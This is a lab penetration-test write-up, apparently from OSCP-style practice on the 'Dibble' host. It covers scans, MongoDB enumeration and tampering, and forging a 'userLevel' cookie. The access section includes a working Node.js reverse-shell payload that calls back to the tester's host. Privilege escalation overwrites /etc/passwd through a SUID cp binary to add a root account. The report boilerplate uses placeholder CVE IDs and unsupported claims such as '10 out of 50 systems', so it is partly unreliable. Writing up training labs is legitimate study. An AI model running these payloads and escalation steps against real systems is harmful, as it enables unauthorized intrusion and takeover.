# Dibble
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2008-1234 | EDB-ID-56789 |
| CVE-2012-5678 | cyberphor POC |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: dibble 
* Description: 
* IP Address: 192.168.186.110
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: (ref:)
* Kernel: (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Sun Aug  8 19:28:14 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/dibble-nmap-complete 192.168.186.110
Nmap scan report for 192.168.186.110
Host is up (0.085s latency).
Not shown: 65535 open|filtered ports, 65530 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
3000/tcp  open  ppp
27017/tcp open  mongod

# Nmap done at Sun Aug  8 19:32:14 2021 -- 1 IP address (1 host up) scanned in 239.63 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Sun Aug  8 19:32:51 2021 as: nmap -sV -sC -pT:21,22,80,3000,27017 -oN scans/dibble-nmap-versions 192.168.186.110
Nmap scan report for 192.168.186.110
Host is up (0.075s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.186
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 9d:3f:eb:1b:aa:9c:1e:b1:30:9b:23:53:4b:cf:59:75 (RSA)
|   256 cd:dc:05:e6:e3:bb:12:33:f7:09:74:50:12:8a:85:64 (ECDSA)
|_  256 a0:90:1f:50:78:b3:9e:41:2a:7f:5c:6f:4d:0e:a1:fa (ED25519)
80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
|_http-generator: Drupal 9 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-server-header: Apache/2.4.46 (Fedora)
|_http-title: Home | Hacking Articles
3000/tcp  open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
27017/tcp open  mongodb MongoDB 4.2.9
| mongodb-databases: 
|   totalSize = 307200.0
|   ok = 1.0
|   databases
|     1
|       name = admin
|       empty = false
|       sizeOnDisk = 40960.0
|     2
|       name = config
|       empty = false
|       sizeOnDisk = 61440.0
|     3
|       name = local
|       empty = false
|       sizeOnDisk = 73728.0
|     0
|       name = account-app
|       empty = false
|_      sizeOnDisk = 131072.0
|_mongodb-info: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  8 19:33:36 2021 -- 1 IP address (1 host up) scanned in 45.20 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Sun Aug  8 19:34:21 2021 as: nmap -O -oN scans/dibble-nmap-os 192.168.186.110
Nmap scan report for 192.168.186.110
Host is up (0.072s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  8 19:34:32 2021 -- 1 IP address (1 host up) scanned in 10.92 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
ftp 192.168.186.110 21 # anonymous:anonymous
```

### HTTP
#### TCP Port 80 (Drupal 9)
```bash
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
---- Scanning URL: http://192.168.186.110/ ----
+ http://192.168.186.110/admin (CODE:403|SIZE:4306)
+ http://192.168.186.110/Admin (CODE:403|SIZE:4306)
+ http://192.168.186.110/ADMIN (CODE:403|SIZE:4306)
+ http://192.168.186.110/batch (CODE:403|SIZE:4306)
+ http://192.168.186.110/cgi-bin/ (CODE:403|SIZE:199)
+ http://192.168.186.110/contact (CODE:200|SIZE:8187)
+ http://192.168.186.110/Contact (CODE:200|SIZE:8187)
==> DIRECTORY: http://192.168.186.110/core/
+ http://192.168.186.110/index.php (CODE:200|SIZE:13708)
==> DIRECTORY: http://192.168.186.110/modules/
+ http://192.168.186.110/node (CODE:200|SIZE:13655)
==> DIRECTORY: http://192.168.186.110/profiles/
+ http://192.168.186.110/robots.txt (CODE:200|SIZE:1594)
+ http://192.168.186.110/search (CODE:302|SIZE:382)
+ http://192.168.186.110/Search (CODE:302|SIZE:382)
==> DIRECTORY: http://192.168.186.110/sites/
==> DIRECTORY: http://192.168.186.110/themes/
+ http://192.168.186.110/user (CODE:302|SIZE:378)
+ http://192.168.186.110/vendor (CODE:403|SIZE:199)
+ http://192.168.186.110/web.config (CODE:200|SIZE:4566)
END_TIME: Sun Aug  8 19:45:54 2021
DOWNLOADED: 4612 - FOUND: 15
```

```bash
# Dirsearch started Mon Aug  9 08:41:21 2021 as: dirsearch.py -u 192.168.186.110 -o /home/victor/oscp/pg/labs/dibble/scans/dibble-dirsearch-80

403   199B   http://192.168.186.110:80/.ht_wsr.txt
403   199B   http://192.168.186.110:80/.htaccess.bak1
403   199B   http://192.168.186.110:80/.htaccess.orig
403   199B   http://192.168.186.110:80/.htaccess.sample
403   199B   http://192.168.186.110:80/.htaccess.save
403   199B   http://192.168.186.110:80/.htaccessBAK
403   199B   http://192.168.186.110:80/.htaccess_extra
403   199B   http://192.168.186.110:80/.htaccess_sc
403   199B   http://192.168.186.110:80/.htaccess_orig
403   199B   http://192.168.186.110:80/.htaccessOLD
403   199B   http://192.168.186.110:80/.htaccessOLD2
403   199B   http://192.168.186.110:80/.html
403   199B   http://192.168.186.110:80/.htm
403   199B   http://192.168.186.110:80/.htpasswd_test
403   199B   http://192.168.186.110:80/.httr-oauth
403   199B   http://192.168.186.110:80/.htpasswds
403   199B   http://192.168.186.110:80/.user.ini
403     4KB  http://192.168.186.110:80/ADMIN
403     4KB  http://192.168.186.110:80/Admin
200    95B   http://192.168.186.110:80/INSTALL.txt
200    18KB  http://192.168.186.110:80/LICENSE.txt
200     6KB  http://192.168.186.110:80/README.txt
302   382B   http://192.168.186.110:80/Search    -> REDIRECTS TO: http://192.168.186.110/search/node
403     4KB  http://192.168.186.110:80/admin
403     4KB  http://192.168.186.110:80/admin/
403     4KB  http://192.168.186.110:80/admin/?/login
403     4KB  http://192.168.186.110:80/admin/index
403   199B   http://192.168.186.110:80/cgi-bin/
200     3KB  http://192.168.186.110:80/composer.json
200   154KB  http://192.168.186.110:80/composer.lock
200     8KB  http://192.168.186.110:80/contact
301   236B   http://192.168.186.110:80/core    -> REDIRECTS TO: http://192.168.186.110/core/
403     4KB  http://192.168.186.110:80/cron/cron.sh
200    13KB  http://192.168.186.110:80/index.php
301   239B   http://192.168.186.110:80/modules    -> REDIRECTS TO: http://192.168.186.110/modules/
200   677B   http://192.168.186.110:80/modules/
200    13KB  http://192.168.186.110:80/node
301   240B   http://192.168.186.110:80/profiles    -> REDIRECTS TO: http://192.168.186.110/profiles/
200     2KB  http://192.168.186.110:80/robots.txt
302   382B   http://192.168.186.110:80/search    -> REDIRECTS TO: http://192.168.186.110/search/node
301   237B   http://192.168.186.110:80/sites    -> REDIRECTS TO: http://192.168.186.110/sites/
200   515B   http://192.168.186.110:80/sites/README.txt
200     0B   http://192.168.186.110:80/sites/example.sites.php
301   238B   http://192.168.186.110:80/themes    -> REDIRECTS TO: http://192.168.186.110/themes/
200     1KB  http://192.168.186.110:80/themes/
403   157B   http://192.168.186.110:80/update.php
302   378B   http://192.168.186.110:80/user    -> REDIRECTS TO: http://192.168.186.110/user/login
200     8KB  http://192.168.186.110:80/user/login/
302   378B   http://192.168.186.110:80/user/    -> REDIRECTS TO: http://192.168.186.110/user/login
403   199B   http://192.168.186.110:80/vendor/
403   199B   http://192.168.186.110:80/vendor/assets/bower_components
403   199B   http://192.168.186.110:80/vendor/composer/autoload_classmap.php
403   199B   http://192.168.186.110:80/vendor/autoload.php
403   199B   http://192.168.186.110:80/vendor/bundle
403   199B   http://192.168.186.110:80/vendor/composer/autoload_files.php
403   199B   http://192.168.186.110:80/vendor/composer/autoload_namespaces.php
403   199B   http://192.168.186.110:80/vendor/composer/ClassLoader.php
403   199B   http://192.168.186.110:80/vendor/composer/autoload_static.php
403   199B   http://192.168.186.110:80/vendor/composer/autoload_real.php
403   199B   http://192.168.186.110:80/vendor/composer/installed.json
403   199B   http://192.168.186.110:80/vendor/composer/LICENSE
403   199B   http://192.168.186.110:80/vendor/composer/autoload_psr4.php
403   199B   http://192.168.186.110:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
403   199B   http://192.168.186.110:80/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
403   199B   http://192.168.186.110:80/vendor/phpunit/src/Util/PHP/eval-stdin.php
403   199B   http://192.168.186.110:80/vendor/phpunit/Util/PHP/eval-stdin.php
200     4KB  http://192.168.186.110:80/web.config
```

#### TCP Port 3000
Is Pepper a user? The picture on the splash page has a robot with the name tag of "Peppper."
```bash
# created an account via registration: victor
```

Any web request to "stylesheets" generates an error (HTTP 301) page. The page describes a working directory of "/home/benjamin" and Node.js.
```bash
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
---- Scanning URL: http://192.168.186.110:3000/ ----
+ http://192.168.186.110:3000/logs (CODE:302|SIZE:33)
+ http://192.168.186.110:3000/Logs (CODE:302|SIZE:33)
+ http://192.168.186.110:3000/stylesheets (CODE:301|SIZE:189)
+ http://192.168.186.110:3000/users (CODE:302|SIZE:33)
END_TIME: Sun Aug  8 20:01:20 2021
DOWNLOADED: 4612 - FOUND: 4
```

```bash
# Dirsearch started Mon Aug  9 08:43:59 2021 as: dirsearch.py -u 192.168.186.110:3000 -o /home/victor/oscp/pg/labs/dibble/scans/dibble-dirsearch-3000

302    33B   http://192.168.186.110:3000/Logs/    -> REDIRECTS TO: /auth/login
200     1KB  http://192.168.186.110:3000/auth/login
302    33B   http://192.168.186.110:3000/logs    -> REDIRECTS TO: /auth/login
302    33B   http://192.168.186.110:3000/logs/    -> REDIRECTS TO: /auth/login
302    33B   http://192.168.186.110:3000/users    -> REDIRECTS TO: /auth/login
302    33B   http://192.168.186.110:3000/users/    -> REDIRECTS TO: /auth/login
200   638B   http://192.168.186.110:3000/users/admin
200   638B   http://192.168.186.110:3000/users/admin.php
200   638B   http://192.168.186.110:3000/users/login
200   638B   http://192.168.186.110:3000/users/login.php
200   638B   http://192.168.186.110:3000/users/login.aspx
200   638B   http://192.168.186.110:3000/users/login.jsp
200   638B   http://192.168.186.110:3000/users/login.html
200   638B   http://192.168.186.110:3000/users/login.js
```

### Mongodb
```bash
mongo 192.168.186.110
show dbs

# output
account-app  0.000GB
admin        0.000GB
config       0.000GB
local        0.000GB
```

```bash
use account-app
show collections

# output
logmsg
users
```

```bash
db.users.find()

# output
{ "_id" : ObjectId("5f73c575eae85a15b8df908d"), "username" : "administrator", "password" : "ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac", "facebook" : "NEVER!", "github" : "http://github.com/", "name" : "administrator", "twitter" : "https://twitter.com/sadserver" }
{ "_id" : ObjectId("611070ac6eb51303c62b1199"), "username" : "victor", "password" : "196b929e6561db925f1d206fc0b78fa16f712f7fabf5e597218bab44863ee109", "facebook" : "", "github" : "", "name" : "admin", "twitter" : "" }
```

```bash
db.version()

# output
4.2.9
```

Changed the password of the administrator account, but it still did not allow me to do anything else.
```bash
db.users.update(
   { _id: ObjectId("5f73c575eae85a15b8df908d") },
   {
    "username" : "administrator",
    "password" : "196b929e6561db925f1d206fc0b78fa16f712f7fabf5e597218bab44863ee109", 
    "facebook" : "", 
    "github" : "", 
    "name" : "administrator", 
    "twitter" : "" 
   }
)
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Credentials
* Application
  * anonymous:anonymous (ref: Nmap scan against TCP port 21)
  * admin (ref: login page on TCP port 80)
  * administrator (ref: events page on TCP port 3000)
  * comprendre (ref: events page on TCP port 3000)
  * Happy_message (ref: events page on TCP port 3000)
  * Mayroong (ref: events page on TCP port 3000)
* Operating System
  * benjamin (ref: login error on TCP port 3000)

If you register for an account and request the "/users" page, the cookie header "userLevel" is used. Possible vector for Node.js serialization? The value smart-decoded (via Burp Decoder) results in "default".
```bash
GET /users HTTP/1.1
Host: 192.168.186.110:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.186.110:3000/auth/login
Connection: close
Cookie: 
  connect.sid=s%3AXZtvxZZdmNt00jvKoc_ik0pnGlfH1bwK.U8y4Q933xuEGitJluotkssVzquIvmV1Zm7fj8gKzwRc;
  userLevel=ZGVmYXVsdA%3D%3D 
Upgrade-Insecure-Requests: 1
```

By smart-encoding "admin" and using Burp Proxy, I was able to add an event.
```bash
# userLevel=YWRtaW4%3D
```

```bash
sudo nc -nvlp 21
```

```bash
# firefox http://192.168.186.110:3000/logs
```

Username of the issue.
```
Victor
```

Event Message (add technical details/code if required).
```bash
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(21, "192.168.49.186", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

```bash
# userLevel=YWRtaW4%3D
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
find / -perm -u=s -type f 2> /dev/null

# output
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/cp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chage
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/newgrp
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
```

Prove cp has SUID-bit set.
```bash
LFILE=/root/proof.txt
cp "$LFILE" /dev/stdout
```

```bash
cat /etc/passwd > /tmp/passwd
echo "victor:$(openssl passwd -crypt password):0:0:victor:/root:/bin/bash" >> /tmp/passwd
cp /tmp/passwd.txt /etc/passwd
su victor
# password = password
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap

## Lessons Learned
* Use multiple tools
